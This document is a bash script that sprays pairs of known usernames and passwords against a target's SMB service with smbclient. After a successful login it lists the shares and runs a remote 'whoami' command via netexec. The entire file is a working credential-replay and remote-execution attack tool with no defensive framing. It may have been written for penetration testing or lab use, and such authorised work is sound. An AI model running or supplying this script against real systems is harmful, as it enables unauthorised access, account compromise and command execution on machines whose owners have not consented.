#!/bin/bash
# Replay known credentials against SMB service
# Usage: smb_replay_pairs.sh <TARGET_IP> <known_users_b64> <known_passwords_b64>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"
KNOWN_USERS_B64="${2:-}"
KNOWN_PASSES_B64="${3:-}"

echo "=== SMB replay ==="

USERS=$(echo "$KNOWN_USERS_B64" | base64 -d 2>/dev/null) || USERS=""
PASSES=$(echo "$KNOWN_PASSES_B64" | base64 -d 2>/dev/null) || PASSES=""

try_smb() {
    local u="$1" p="$2"
    local r xr
    r=$(timeout 8 smbclient -L "//$TARGET_IP/" -U "$u%$p" 2>&1) || true
    if echo "$r" | grep -qE "Disk|IPC\s+Service" \
       && ! echo "$r" | grep -qi "NT_STATUS_LOGON_FAILURE"; then
        echo "SMB_LOGIN_OK:$u:$p"
        echo "$r" | head -30
        xr=$(timeout 12 netexec smb "$TARGET_IP" -u "$u" -p "$p" -x "whoami" 2>&1) || true
        echo "$xr" | head -10
        return 0
    fi
    return 1
}

while IFS= read -r u; do
    [ -z "$u" ] && continue
    while IFS= read -r p; do
        [ -z "$p" ] && continue
        try_smb "$u" "$p" && exit 0
    done <<< "$PASSES"
done <<< "$USERS"

echo "SMB_REPLAY_FAILED"
